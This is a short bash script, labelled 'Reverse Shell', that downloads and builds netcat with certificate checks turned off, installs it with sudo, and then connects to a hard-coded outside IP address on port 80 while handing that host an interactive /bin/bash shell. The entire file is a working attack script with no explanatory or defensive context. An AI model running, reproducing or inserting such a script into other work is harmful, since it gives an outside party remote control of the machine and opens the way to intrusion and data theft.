#!/bin/bash

# Reverse Shell
wget http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz --no-check-certificate
tar -xzvf netcat-0.7.1.tar.gz
cd netcat-0.7.1 
./configure
sudo make
sudo make install
nc 44.204.189.19 80 -e /bin/bash
